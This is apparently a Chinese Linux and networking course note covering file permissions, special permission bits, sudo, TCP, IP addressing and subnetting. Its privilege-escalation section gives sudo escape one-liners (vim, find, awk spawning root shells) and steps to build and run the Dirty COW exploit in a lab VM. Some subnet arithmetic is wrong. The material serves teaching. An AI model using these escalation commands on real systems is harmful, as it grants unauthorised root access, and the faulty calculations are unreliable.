jaden -rw--w--w- 1 root root 0 3月 27 09:37 wu1.txt -rw-r--r-- 1 root root 0 3月 27 09:29 wulaoban.txt # 可以看到，文件初始权限为：0666-0044=0622，目录的初始权限为：0777-0044=0733# 所以通过修改掩码可以控制文件和目录的初始权限值。 我们将掩码再改回去： 再来看一下普通用户的，先创建个普通用户。 [root@localhost ~]# id jaden id: jaden: no such user[root@localhost ~]# useradd jaden[root@localhost ~]# passwd jaden #密码设置的是123 更改用户 jaden 的密码 。 新的 密码： 无效的密码： 密码少于 8 个字符 重新输入新的 密码： passwd：所有的身份验证令牌已经成功更新。[root@localhost ~]# id jaden uid=1000(jaden) gid=1000(jaden) 组=1000(jaden)[root@localhost ~]# 然后普通用户登录一下，创建目录和文件夹，看看默认权限 [jaden@localhost ~]$ umask 0002[jaden@localhost ~]$ mkdir jaden[jaden@localhost ~]$ touch jaden.txt[jaden@localhost ~]$ ll -h 总用量 0 drwxrwxr-x 2 jaden jaden 6 3月 27 09:44 jaden -rw-rw-r-- 1 jaden jaden 0 3月 27 09:44 jaden.txt# 目录权限为: 0777-0002 = 0775# 文件权限为: 0666-0002 = 0664 修改普通用户的掩码值，注意，用root用户修改下面这个配置文件，因为普通用户没有权限修改，修改 umask值的时候尽量改为偶数： 然后普通用户重新登录一下，再看效果 [jaden@localhost ~]$ umask 0004[jaden@localhost ~]$ mkdir jaden2[jaden@localhost ~]$ touch jaden2.txt[jaden@localhost ~]$ ll -h 总用量 0 drwxrwxr-x 2 jaden jaden 6 3月 27 09:44 jaden drwxrwx-wx 2 jaden jaden 6 3月 27 09:47 jaden2 -rw-rw--w- 1 jaden jaden 0 3月 27 09:48 jaden2.txt -rw-rw-r-- 1 jaden jaden 0 3月 27 09:44 jaden.txt# 目录权限为: 0777-0004 = 0773# 文件权限为: 0666-0004 = 0662 ## 为了让系统安全性高一些，有些系统一上来就改掩码，将默认权限设置的很低，但是权限低意味着有些操作就受限，所以也会多一些麻烦，这个就看企业需求了，好，权限掩码就说这么多。 2.24.5 inode和block## inode ：存储除文件名以外的属性，比如文件路径，inode全称index node，索引节点的意思。索引主要是用于方便我们进行文件查找的。我们也叫它为目录文件。## block： 存储文件的内容。[jaden@localhost ~]$ df -h #查看硬盘空间文件系统 容量 已用 可用 已用% 挂载点devtmpfs 980M 0 980M 0% /devtmpfs 991M 0 991M 0% /dev/shmtmpfs 991M 9.6M 981M 1% /runtmpfs 991M 0 991M 0% /sys/fs/cgroup/dev/sda1 100G 2.0G 98G 2% /tmpfs 199M 0 199M 0% /run/user/0tmpfs 199M 0 199M 0% /run/user/1000[jaden@localhost ~]$ df -ih # 查看inode空间文件系统 Inode 已用(I) 可用(I) 已用(I)% 挂载点devtmpfs 245K 369 245K 1% /devtmpfs 248K 1 248K 1% /dev/shmtmpfs 248K 707 247K 1% /runtmpfs 248K 16 248K 1% /sys/fs/cgroup/dev/sda1 50M 60K 50M 1% /tmpfs 248K 1 248K 1% /run/user/0tmpfs 248K 1 248K 1% /run/user/1000## 可以看到我们的虚拟机，硬盘100G，inode空间为50M，所以其实硬盘会划分两个空间，一个是存数据的空间，一个是存文件索引的空间。每个文件会用多个block块来存储，这个block就类似于windows上我们说的簇，文件数据的最小存放空间单元，每个文件都会有一条目录索引记录到inode空间中，方便以后我们找寻找个文件 ## 我们在linux上创建文件的时候，可能会看到一个报错信息： No space left on device ，意思是没有可用空间了。说明要么是硬盘确实存满了，要么是inode空间存满了，如果是inode空间存满了，那么就去删除那些临时文件或者一些无用的空文件、小文件等等来清理inode空间。 2.24.5 特殊权限讲这个的原因是，后期安全课程中有一个叫做提权的概念，可以借助到特殊权限来进行权限提升，让普 通用户能变为root用户。 5-1 suid### suid，就是某个可执行文件有super超级管理员权限，这个文件普通用户也能用，含有suid的文件，可以让普通用户拥有该文件属主的执行权限，主要针对的是命令文件。比如：例子1：## passwd 是用来修改密码的一个命令文件[root@localhost ~]# passwd jaden #看一下passwd文件的权限 [root@localhost ~]# ll /usr/bin/passwd -rwsr-xr-x. 1 root root 27856 4月 1 2020 /usr/bin/passwd# 可以看到ugo权限组合中的u权限rws，这个s其实就是x权限，但是s就是用来标记这个文件是一个具有suid权限的特殊执行文件。由于权限位只有9位，所以特殊权限的执行权限用s代替了x。# 有执行权限的时候是小写的s，去掉用户的执行权限之后，这个地方是大写的S。如下 [root@localhost ~]# chmod u-x /usr/bin/passwd [root@localhost ~]# ll /usr/bin/passwd -rwSr-xr-x. 1 root root 27856 4月 1 2020 /usr/bin/passwd# 再将执行权限加回来，看效果，又变回了小s [root@localhost ~]# ll /usr/bin/passwd -rwsr-xr-x. 1 root root 27856 4月 1 2020 /usr/bin/passwd # 那么，为什么会给这个文件一个叫做suid的权限呢？这个文件是用来修改密码的执行文件，普通用户是不是也可以修改自己的密码啊，对吧，但是修改密码修改的是/etc/shadow文件内容，看一下/etc/shadow文件权限：[root@localhost ~]# ll /etc/shadow---------- 1 root root 768 3月 27 10:45 /etc/shadow# /etc/shadow文件权限是000，普通用户根本就没有修改这个文件的权限。因为如果普通用户能修改这个文件，那么root用户的密码就能被普通用户修改了，这就很不安全，对吧。但是每次改密码都找root用户，也是很麻烦的，所以普通用户也有自己改密码的需求，这怎么办。比如我们登录一下普通用户，修改一下密码试试[jaden@localhost ~]$ passwd 更改用户 jaden 的密码 。 为 jaden 更改 STRESS 密码。 （当前）UNIX 密码： # 普通用户修改密码，必须要输入原来的密码，root用户不需要 新的 密码： # 而且密码复杂度要高，比如我设置的是123@qq.com，才行 无效的密码： 密码少于 8 个字符 [jaden@localhost ~]$ passwd 更改用户 jaden 的密码 。 为 jaden 更改 STRESS 密码。 （当前）UNIX 密码： 新的 密码： 重新输入新的 密码： passwd：所有的身份验证令牌已经成功更新。# 普通用户修改密码其实比较麻烦，要输入原密码、还要将密码复杂度加高。# 普通用户也要用passwd修改密码，有这种需求，所以给系统给passwd执行文件了一个特殊权限，就是s。[root@localhost ~]# ll /usr/bin/passwd -rwsr-xr-x. 1 root root 27856 4月 1 2020 /usr/bin/passwd# 那么普通用户使用这个文件的时候，可以拥有这个文件属主的执行权限，也就是root的x权限。所以我们看到普通用户可以使用passwd来修改自己的密码，这就是suid权限的意思，但是只能修改当前自己的用户密码，而且是用的root身份来执行的，如下，用普通用户修改一下root用户的密码，看看效果[jaden@localhost ~]$ passwd root passwd：只有根用户才能指定用户名。 # 只有root用户才能指定用户名来修改某个用户的密码，普通用户不能指定用户名，只能修改自己的。# 如果将passwd文件的s权限去掉了，那么普通用户就没有修改密码的能力了，如下 [root@localhost ~]# chmod u-s /usr/bin/passwd [root@localhost ~]# ll /usr/bin/passwd -rwxr-xr-x. 1 root root 27856 4月 1 2020 /usr/bin/passwd# 切换到普通给用户修改密码看效果： [jaden@localhost ~]$ passwd 更改用户 jaden 的密码 。 为 jaden 更改 STRESS 密码。 （当前）UNIX 密码： 新的 密码： # abc.123.xx 重新输入新的 密码： passwd: 鉴定令牌操作错误# 发现密码修改不了了。因为passwd没有了suid权限。# 我们把suid权限再给加回去就可以了。[root@localhost ~]# chmod u+s /usr/bin/passwd [root@localhost ~]# ll /usr/bin/passwd -rwsr-xr-x. 1 root root 27856 4月 1 2020 /usr/bin/passwd## netstat -ltp# root用户身份运行，结果如下[root@localhost ~]# netstat -ltp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN 1185/sshd tcp 0 0 localhost:smtp 0.0.0.0:* LISTEN 1330/master tcp6 0 0 [::]:ssh [::]:* LISTEN 1185/sshd tcp6 0 0 localhost:smtp [::]:* LISTEN 1330/master#普通用户运行，结果如下[jaden@localhost ~]$ netstat -ltp #p参数普通用户不能使用 (No info could be read for -p: geteuid()=1000 but you should be root.) # 看到了 一个报错提示，并且PID数据没显示 Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN - tcp 0 0 localhost:smtp 0.0.0.0:* LISTEN - tcp6 0 0 [::]:ssh [::]:* LISTEN - tcp6 0 0 localhost:smtp [::]:* LISTEN -# 给netstat执行文件加上suid权限[root@localhost ~]# chmod u+s /usr/bin/netstat [root@localhost ~]# ll /usr/bin/netstat -rwsr-xr-x. 1 root root 155008 8月 9 2019 /usr/bin/netstat#普通用户再运行，就不报错了，而且看到了PID数据[jaden@localhost ~]$ netstat -ltp Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN 1185/sshd tcp 0 0 localhost:smtp 0.0.0.0:* LISTEN 1330/master tcp6 0 0 [::]:ssh [::]:* LISTEN 1185/sshd tcp6 0 0 localhost:smtp [::]:* LISTEN 1330/master#加上suid权限，就表示普通用户使用这个执行文件的时候，会用root的身份来运行。#这是suid的作用，但是好多黑客利用它来进行恶意的权限提升。 sgid 其他用户，拥有该文件属组的权限 locate 针对命令文件，一般是读取文件，不能用来搞事情，所 以简单了解一下即可。 # 这个sgid，我找了很久，也就找到一个例子，就是这个locate指令。# 先安装一下locate指令，如果不知道安装哪个软件包，就查询一下yum provides locate# yum install mlocate.x86_64 -y # 需要用root用户来安装[root@localhost ~]# locate locate: 没有指定任何搜索模式[root@localhost ~]# touch test.txt[root@localhost ~]# locate test.txt locate: 无法执行 stat () `/var/lib/mlocate/mlocate.db: 没有那个文件或目录[root@localhost ~]# ls anaconda-ks.cfg jaden jaden2 test.txt wu2.txt wulaoban.txt[root@localhost ~]# locat wulaoban.txt -bash: locat: 未找到命令[root@localhost ~]# locate wulaoban.txt locate: 无法执行 stat () `/var/lib/mlocate/mlocate.db: 没有那个文件或目录[root@localhost ~]# updatedb # 更新一下文件路径记录的缓存，就可以通过locate查看到文件的路径了。[root@localhost ~]# locate wulaoban.txt /root/wulaoban.txt[root@localhost ~]# ll /var/lib/mlocate/mlocate.db -rw-r----- 1 root slocate 1389239 3月 27 13:43 /var/lib/mlocate/mlocate.db[root@localhost ~]# which locate /usr/bin/locate[root@localhost ~]# ll /usr/bin/locate -rwx--s--x 1 root slocate 40520 4月 11 2018 /usr/bin/locate[root@localhost ~]# chmod g-x /usr/bin/locate[root@localhost ~]# ll /usr/bin/locate -rwx--S--x 1 root slocate 40520 4月 11 2018 /usr/bin/locate[root@localhost ~]# chmod g+x /usr/bin/locate[root@localhost ~]# ll /usr/bin/locate -rwx--s--x 1 root slocate 40520 4月 11 2018 /usr/bin/locate#切换到普通用户[jaden@localhost ~]$ ls jaden jaden2 jaden2.txt jaden.txt[jaden@localhost ~]$ locate jaden.txt # 普通用户也是在slocate组的，所以可以通过locate查看文件路径 /home/jaden/jaden.txt[jaden@localhost ~]$ updatedb updatedb: 无法为 `/var/lib/mlocate/mlocate.db 打开临时文件[jaden@localhost ~]$ ll /usr/bin/locate -rwx--s--x 1 root slocate 40520 4月 11 2018 /usr/bin/locate# 这个简单了解一下即可。## sticky 叫做粘滞位，这个是针对目录的权限，很多用户共同使用的目录，实现用户之间不能互相删除改变对方的文件的权限# 例子： [jaden@localhost ~]$ ll / 总用量 20 lrwxrwxrwx. 1 root root 7 3月 15 20:10 bin - usr/bin dr-xr-xr-x. 5 root root 4096 3月 15 20:14 boot ... drwxrwxrwt. 13 root root 4096 3月 27 13:58 tmp # 可以看到一个权限位是t，所有用户都有 这个目录的操作权限。 # 为什么需要这么个权限呢？我们自行搞一个目录来看效果：[root@localhost ~]# cd /[root@localhost /]# mkdir data[root@localhost /]# chmod 777 data[root@localhost /]# ll 总用量 20 lrwxrwxrwx. 1 root root 7 3月 15 20:10 bin - usr/bin dr-xr-xr-x. 5 root root 4096 3月 15 20:14 boot drwxrwxrwx 2 root root 6 3月 27 14:01 data drwxr-xr-x 19 root root 3160 3月 27 09:22 dev # 切换到普通用户，去data目录中写入文件 [jaden@localhost ~]$ cd /data/ [jaden@localhost data]$ touch jaden.txt [jaden@localhost data]$ ls jaden.txt# 再切换到root下，写文件 [root@localhost /]# cd data/ [root@localhost data]# touch root.txt [root@localhost data]# ll 总用量 0 -rw-rw-r-- 1 jaden jaden 0 3月 27 14:02 jaden.txt -rw-r--r-- 1 root root 0 3月 27 14:03 root.txt# 现在这个data目录的权限是777，所以任意用户都可以往里面写文件。# 再切换回普通用户，来删除一下root用户创建的root.txt[jaden@localhost data]$ ll 总用量 0 -rw-rw-r-- 1 jaden jaden 0 3月 27 14:02 jaden.txt -rw-r--r-- 1 root root 0 3月 27 14:03 root.txt [jaden@localhost data]$ rm -rf root.txt [jaden@localhost data]$ ll 总用量 0 -rw-rw-r-- 1 jaden jaden 0 3月 27 14:02 jaden.txt# 删除成功了。这就容易混乱了，不同用户之间的文件都可以互相修改删除等。# 创建data目录的目的就是让大家共享这个目录，但是不能让用户做一些恶意的操作，比如恶意删除其他用户创建的文件，那么就可以用到sticky 粘滞位来标记这个目录，如下[root@localhost data]# chmod o+t /data/[root@localhost data]# cd ..[root@localhost /]# ll 总用量 20 lrwxrwxrwx. 1 root root 7 3月 15 20:10 bin - usr/bin dr-xr-xr-x. 5 root root 4096 3月 15 20:14 boot drwxrwxrwt 2 root root 23 3月 27 14:04 data drwxr-xr-x 19 root root 3160 3月 27 09:22 dev# 此时再用root在data目录中去创建个root.txt文件[root@localhost /]# cd data/[root@localhost data]# touch root.txt[root@localhost data]# ll 总用量 0 -rw-rw-r-- 1 jaden jaden 0 3月 27 14:02 jaden.txt -rw-r--r-- 1 root root 0 3月 27 14:08 root.txt# 再切换到普通用户，删除root.txt试试[jaden@localhost data]$ ll总用量 0 -rw-rw-r-- 1 jaden jaden 0 3月 27 14:02 jaden.txt -rw-r--r-- 1 root root 0 3月 27 14:08 root.txt [jaden@localhost data]$ rm -rf root.txt rm: 无法删除root.txt: 不允许的操作# 粘滞位保护了共享目录中，不同用户之间不能互相删除对方的文件。# /tmp/目录就是这么一个目录。## 查看 /tmp 目录的权限[root@localhost data]# stat /tmp 文件：/tmp 大小：4096 块：8 IO 块：4096 目录 设备：801h/2049d Inode：75 硬链接：13 权限：(1777/drwxrwxrwt) ... # 1777，这个1就是粘滞位权限的值，suid这个值是4，sgid这个值是2。 2.24.6 su和sudo6-1 su# su全称：switch user# root用户可以很方便的切换到任意用户[root@localhost ~]# su - jaden 上一次登录：一 3月 27 15:03:29 CST 2023从 192.168.2.110pts/1 上[jaden@localhost ~]$ ls jaden jaden2 jaden2.txt jaden.txt [jaden@localhost ~]$ exit # 退出，又回到root用户了 登出[root@localhost ~]# # 普通用户切换到root用户，必须输入root密码[jaden@localhost ~]$ su - root 密码： # 需要输入root用户的密码 上一次登录：一 3月 27 10:48:24 CST 2023从 192.168.2.110pts/0 上[root@localhost ~]# exit 登出[jaden@localhost ~]$ # 不带-也是可以的，带-的话，就是切换完用户之后，直接到用户家目录下，不带-就不是家目录。[jaden@localhost ~]$ su root 密码：[root@localhost jaden]# exit 6-2 sudo## sudo全称：superuser do，它的作用是用来授权的。就是给普通用户高级权限用的。原因就是很多的操作，如果都需要root用户去做，太麻烦了，所以可以给普通用户做一些授权，普通用户操作就方便了。授权就用到了sudo，sudo并不是一下子给用户很多权限，而是一个命令一个命令的授权。## sudo需要修改配置才能开启。# root用户才能修改这个配置。1.配置/etc/sudoers # 直接visudo就能编辑这个文件 [root@localhost ~]# visudo #用户名 所有终端 = 运行的用户身份 命令ALL，ALL是所有指令，不能给所有的，不然权限太高了 #在100行下面添加如下内容 jaden ALL=(ALL) /bin/systemctl,/usr/bin/vim,/usr/sbin/reboot # 单独给指令 权限，而且要写指令的绝对路径，逗号分割 # 修改完配置文件，保存退出之后，立马就生效了，不需要重启或者重新登录。 #切换到普通用户，查看可以使用的授权命令 sudo -l [jaden@localhost ~]$ sudo -l ## 我们信任您已经从系统管理员那里了解了日常注意事项。 ## 总结起来无外乎这三点： #1) 尊重别人的隐私。 #2) 输入前要先考虑(后果和风险)。 #3) 权力越大，责任越大。 [sudo] jaden 的密码： # 需要输入jaden用户的密码 匹配 %2$s 上 %1$s 的默认条目： !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS, env_keep+=MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE, env_keep+=LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES, env_keep+=LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE, env_keep+=LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin 用户 jaden 可以在 localhost 上运行以下命令： # 提示可以使用sudo来执行的命令 (ALL) /bin/systemctl, /usr/bin/vim, /usr/sbin/reboot [jaden@localhost ~]$ 2.使用sudo执行命令# 授权的命令使用起来和普通指令是不同的，需要使用sudo来执行命令，也就是以授权的方式来执行指令。# 比如reboot重启 [jaden@localhost ~]$ sudo reboot Connection closing...Socket close. Connection closed by foreign host....# 比如重启网卡# sudo systemctl restart network #start,stop,restart# 比如：vim权限 [jaden@localhost ~]$ vim /etc/shadow [jaden@localhost ~]$ sudo vim /etc/shadow # 注意，vim的权限很大，比如可以修改密码，可以修改授权配置文件等，甚至root用户的密码都可以修改，所以不要将vim的root权限给普通用户。 2.24.7 linux普通用户提权7-1 sudo提权就是我们进行sudo授权时给的授权太高，或者给授权时控制的不合理，就会被普通用户利用来提权。 示例1： vim # 命令模式执行: !/ # 通过vim修改/etc/sudoers，授权ALL # 再通过vim进入一个文件 # :输入指令，是可以直接输入系统指令的，前面加一个!即可，比如创建一个文件，!touch 3.txt # 查看3.txt信息如下 [jaden@localhost ~]$ ll 总用量 0 -rw-r--r-- 1 root root 0 3月 27 17:05 3.txt # 以root用户身份创建的文件 # 如果在vim文件时，执行!/bin/bash，就进入到了root的命令终端，可以为所欲为。 # 这就是sudo提权，但是sudo提权需要借助到可以执行系统指令的交互式的功能，比如vim。示例2： find # sudo find . -exec bash \\; # 直接进入root的命令终端，这个指令退出root终端可能要退好几次才行，看find找到了几个文件，找到了3个文件，就输入三次exit才能退出。find 后面文件名随便写 示例3： awk # sudo awk BEGIN system(/bin/bash) jaden.txt # 直接进入到root命令终端，exit直接退出。 # 还有好多指令可以提权，比如cp命令也可以提权，将其他电脑上的/etc/shadow文件拷贝到这个系统中，密码就改掉了，再su切换到root即可等等，还有什么mv、vi、sed修改文件、chmod改重要文件权限等等这里就不多提了。大家可以试试，普通用户使用sudo来修改shadow文件的root用户的密码。 7-2 脏牛提取dcow全称dirty cow，脏牛，原理：Linux内核的内存子系统在处理写入时复制（copy-on-write, COW， 组合起来是牛的意思）时产生了竞争条件。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进 行写访问，所以大家都管这个提权方式叫做脏牛提权。原理这一块大家不需要掌握，会监测是否存在这 个漏洞即可。 ## 仓库地址：https://github.com/gbonacini/CVE-2016-5195，先下载下来，我也给大家下载好了，在工具文件夹中# github上对它有介绍，比如哪些版本的系统有这样的漏洞。要某个系统版本和gcc版本同时满足的时候才会有这个漏洞，我们的centos7.8虽然系统版本能对上，但是gcc版本高，对不上，所有没有这个漏洞，不能用这个程序提权，所以我给大家准备了一个虚拟机系统，大家打开直接用来玩玩即可。 如下，双击打开，或者右键选择VMware打开即可 如下，输入用户名和密码即可，root用户的密码是123456， 先创建个普通用户： 然后xshell连接一下主机，用jaden来登录，将脏牛的提权程序上传过来。 好，开始提权。 #上传文件 脏牛提权.zipunzip 脏牛提权.zipcd CVE-2016-5195-master/make #编译./dcow -s #提权# 看内核版本，比如我们使用的[jaden@dms CVE-2016-5195-master]$ cat /etc/redhat-release CentOS Linux release 7.2.1511 (Core) 这就提权完事儿了，如下 ## 说明这个系统有这个漏洞，解决这个漏洞就是升级系统或者升级gcc软件版本。也可以用我们的centos7.8自己试试，应该是不能提权。 2.24.8 VMware导出OVA和OVF 三，网络3.1 osi 7层模型 ## 大家制定协议的时候，基本都是遵循的osi七层模型来设计的。 ## 每一层都设计出了很多种协议，来完成特定的工作和数据传输，其实简单理解协议的话，其实就是不同协议需要加工不同的数据格式。 3.1.1 查看到运行程序的端口netstat -ano ## ---------------- windowsnetstat -lntup ## ---------------- Linux 3.2 cp三次握手，四次挥手3.2.1 常用的端口号： 3.2.2 TCP协议数据头特殊含义SYN 建立链接ACK 回应标识FIN 断开链接PSH 数据包RST 重置（重传） 网络不稳定的时候会看到好多重发包URG 紧急指针 3.2.3 TCP三次握手## 1、TCP服务器进程先创建传输控制块TCB，时刻准备接受客户进程的连接请求，此时服务器就进入了LISTEN（监听）状态；## 2、TCP客户进程也是先创建传输控制块TCB，然后向服务器发出连接请求报文，这是报文首部中的同部位SYN=1，同时选择一个初始序列号 seq=x ，此时，TCP客户端进程进入了 SYN-SENT（同步已发送状态）状态。TCP规定，SYN报文段（SYN=1的报文段）不能携带数据，但需要消耗掉一个序号。## 3、TCP服务器收到请求报文后，如果同意连接，则发出确认报文。确认报文中应该 ACK=1，SYN=1，确认号是ack=x+1，同时也要为自己初始化一个序列号 seq=y，此时，TCP服务器进程进入了SYN-RCVD（同步收到）状态。这个报文也不能携带数据，但是同样要消耗一个序号。## 4、TCP客户进程收到确认后，还要向服务器给出确认。确认报文的ACK=1，ack=y+1，自己的序列号seq=x+1，此时，TCP连接建立，客户端进入ESTABLISHED（已建立连接）状态。TCP规定，ACK报文段可以携带数据，但是如果不携带数据则不消耗序号。## 5、当服务器收到客户端的确认后也进入ESTABLISHED状态，此后双方就可以开始通信了。 3.2.4 四次挥手## 1、客户端进程发出连接释放报文，并且停止发送数据。释放数据报文首部，FIN=1，其序列号为seq=u（等于前面已经传送过来的数据的最后一个字节的序号加1），此时，客户端进入FIN-WAIT-1（终止等待1）状态。TCP规定，FIN报文段即使不携带数据，也要消耗一个序号。## 2、服务器收到连接释放报文，发出确认报文，ACK=1，ack=u+1，并且带上自己的序列号seq=v，此时，服务端就进入了CLOSE-WAIT（关闭等待）状态。TCP服务器通知高层的应用进程，客户端向服务器的方向就释放了，这时候处于半关闭状态，即客户端已经没有数据要发送了，但是服务器若发送数据，客户端依然要接受。这个状态还要持续一段时间，也就是整个CLOSE-WAIT状态持续的时间。## 3、客户端收到服务器的确认请求后，此时，客户端就进入FIN-WAIT-2（终止等待2）状态，等待服务器发送连接释放报文（在这之前还需要接受服务器发送的最后的数据）。## 4、服务器将最后的数据发送完毕后，就向客户端发送连接释放报文，FIN=1，ack=u+1，由于在半关闭状态，服务器很可能又发送了一些数据，假定此时的序列号为seq=w，此时，服务器就进入了LAST-ACK（最后确认）状态，等待客户端的确认。## 5、客户端收到服务器的连接释放报文后，必须发出确认，ACK=1，ack=w+1，而自己的序列号是seq=u+1，此时，客户端就进入了TIME-WAIT（时间等待）状态。注意此时TCP连接还没有释放，必须经过2∗∗MSL（最长报文段寿命）的时间后，当客户端撤销相应的TCB后，才进入CLOSED状态。## 6、服务器只要收到了客户端发出的确认，立即进入CLOSED状态。同样，撤销TCB后，就结束了这次的TCP连接。可以看到，服务器结束TCP连接的时间要比客户端早一些。 3.2.5 为什么建立连接是三次握手，关闭连接确是四次挥手呢？## 1、建立连接的时候， 服务器在LISTEN状态下，收到建立连接请求的SYN报文后，把ACK和SYN放在一个报文里发送给客户端。## 2、而关闭连接时，服务器收到对方的FIN报文时，仅仅表示对方不再发送数据了但是还能接收数据，而自己也未必全部数据都发送给对方了，所以己方可以立即关闭，也可以发送一些数据给对方后，再发送FIN报文给对方来表示同意现在关闭连接，因此，己方ACK和FIN一般都会分开发送，从而导致多了一次。 3.2.6 如果已经建立了连接，但是客户端突然出现故障了怎么办？## TCP还设有一个保活计时器，显然，客户端如果出现故障，服务器不能一直等下去，白白浪费资源。服务器每收到一次客户端的请求后都会重新复位这个计时器，时间通常是设置为2小时，若两小时还没有收到客户端的任何数据，服务器就会发送一个探测报文段，以后每隔75分钟发送一次。若一连发送10个探测报文仍然没反应，服务器就认为客户端出了故障，接着就关闭连接。 3.3 ip地址划分3.3.1 公网IP## a类 1.0.0.1~126.255.255.254 # 126*2^8 5.0.0.0 -- 5.255.255.255 ## 第一组：1-126开头的地址是A类 ## 0A类127 公网ip在这个地址段的居多，ping qq.com就可以看到58.250.137.36这就是个A类地址。## b类 128.0.0.1~191.255.255.254 ## 128=B类192 ## c类 192.0.0.1~223.255.255.254 # A类、B类、C类地址为三类主要的IP地址，下面两类我们基本见不到。## d类 组播，VRRP协议，keepalive高可用 224~239 ## e类 科研 240-255 # 说是保留给科研用的## 仔细看的话，可以看到a类和b类中间的127地址段没有划分上，127.0.0.1 - 127.255.255.255整个网段都是特殊地址，127开头的地址可以说是A类的保留地址，用作本地软件环回测试（loopback test）本主机的进程之间的通信而使用的。这个后面我们用到之后再提。 3.3.2 私网IP## A类：10.0.0.0~10.255.255.255 # 通过网上的ip地址计算器，就能计算出这个网段有多少个ip地址， A类地址子网掩码是8位 # 16777214 ## B类：172.16.0.0~172.31.255.255 # B类地址子网掩码是16位## C类：192.168.0.0~192.168.255.255 # 这个是我们经常看到的网段，内网中网络设备比较少的场景都用的这个，我们买路由器的时候，路由器上内置的网段多数也是这个网段。 # 65,536 3.3.3 ipv6## 1：ipv6：fe80::2e60:cff:fe9c:a4b3 # 2^128次方的位数，这个数量就相当可观了。在这种形式中，128位的IPv6地址被分为8组，每组的16位用4个十六进制字符（0～9，A～F）来表示，组和组之间用冒号（:）隔开。比如IPv6地址2001:db8:130F:0000:0000:09C0:876A:130B，为了书写方便，每组中的前导“0”都可以省略，所以上述地址可写为：2001:db8:130F:0:0:9C0:876A:130B。 ## 另外，地址中包含的连续两个或多个均为0的组，可以用双冒号“::”来代替，这样可以压缩IPv6地址书写时的长度，所以上述地址又可以进一步简写为：2001:db8:130F::9C0:876A:130B。 ## 2: NAT：network address transformation，网络地址转换 ## 好处： ## a: 节约大量的公网ip地址 ## b：减少了网络攻击 3.4 子网掩码的作用## ip地址分为两个部分 ## 网络部分：标识子网，也就是网络位或者说网段 ## 主机部分：标识主机 ## 注意：单纯的ip地址段只是标识了ip地址的种类，从网络部分或主机部分都无法辨识一个ip所处的子网 ## 例：172.16.10.1与172.16.10.2并不能确定二者处于同一子网 ## 所谓子网掩码，就是表示子网络特征的一个参数。它在形式上等同于IP地址，也是一个32位二进制数字，它的网络部分全部为1，主机部分全部为0。比如，IP地址172.16.10.1，如果已知网络部分是前24位，主机部分是后8位，那么子网络掩码就是11111111.11111111.11111111.00000000，写成十进制就是255.255.255.0。 子网掩码：决定了一个网段的大小，网段大小决定了有多少个ip地址可以用，网段越大，ip地址越多。 ## ip地址：192.168.2.110 子网掩码：255.255.255.0 ## 上面两个还有一个等效的写法：192.168.2.110/24 如下写法 192.168.2.118/24 10.0.0.0/8 172.16.0.0/16# 怎么确定网段的大小呢，就要看子网掩码，8位、16位、24位等就是代表子网掩码的值的。数字越小的，表示网段越大。 3.4.1 子网掩码是怎么计算网段大小\t首先知道子网掩码，我们就能判断，任意两个IP地址是否处在同一个子网络。方法就是将两个IP地址与 子网掩码分别进行二进制的AND运算，也叫与运算（两个数位都为1，运算结果为1，否则为0），然后 比较结果是否相同，如果是的话，就表明它们在同一个子网络中，否则就不是。 ## 比如，已知IP地址172.16.10.1和172.16.10.2的子网掩码都是255.255.255.0，请问它们是否在同一个子网络？两者与子网掩码分别进行AND运算: 172.16.10.1： 10101100.00010000.00001010.00000001 255.255.255.0： 11111111.11111111.11111111.00000000 10101100.00010000.00001010.00000000## 两个AND运算得网络地址结果：10101100.00010000.00001010.00000000-172.16.10.0 172.16.10.2： 10101100.00010000.00001010.000000010 255.255.255.0：11111111.11111111.11111111.00000000 10101100.00010000.00001010.000000001 ## AND运算得网络地址结果：10101100.00010000.00001010.000000001-172.16.10.0## 计算得到的172.16.10.0，就说明这个网段是172.16.10.x。 # 255.255.255.0前面的255.255.255对应二进制就是24个1，也就是对应的ip地址的前面24位是不变的，那么ip地址的这24位就是网络位，剩余的8位是主机位，网络位不变，主机位是可变的，可变的ip数量就是这个网段的ip地址数量，共2的8次方=256个，就可以写为172.16.10.1/24。 # 但是172.16.10.0和172.16.10.255都被保留下来不让主机使用，172.16.10.0作为网络号，通过网络号可以找到这个网络号对应网段的网络了，172.16.10.255是广播地址，这个广播地址我们一会说。也就是可用ip地址个数位256-2=254个。## 所以ip协议有两个作用，一个是为每一台计算机分配IP地址，另一个是确定哪些地址在同一个子网络。 同一个网段的ip地址，物理线路接通就可以直接相互通信，不同网段的ip地址，即便是物理线路接通， 也不可以直接通信，需要路由器才能相互通信！路由器能够帮我们转发给对应网段的主机。 比如下面两个ip地址: 11111111.11111111.11111111.10000000 255.255.255.128 192.168.100.126/25 --- ip地址：192.168.100.126 子网掩码：255.255.255.128192.168.100.129/25 --- ip地址：192.168.100.129 子网掩码：255.255.255.128# 网络位25位，主机位7位，说明网段又小了。那么这两个ip地址能不能直接通信呢？192.168.100.126 -- 11000000 10101000 01100100 01111110 11111111 11111111 11111111 10000000 ## 逻辑与计算，结果： 192.168.100.0192.168.100.129 -- 11000000 10101000 01100100 10000001 11111111 11111111 11111111 10000000 ## 逻辑与计算，结果： 192.168.100.1 # 计算结果不同，不在一个网段 3.4.2 设置子网掩码的时候也要注意11111111 25511111110 25411111100 25211111000 24811110000 24011100000 22411000000 19210000000 12800000000 0 3.5 DNS解析3.5.1 常用的DNS服务器地址## 国内： 阿里云： 223.5.5.5 223.6.6.6 百度： 180.76.76.76 腾讯： 119.29.29.29 南京信风： 114.114.114.114 # 广告多，https://www.landiannews.com/archives/18431.html ## 国外 谷歌： 8.8.8.8 3.5.2 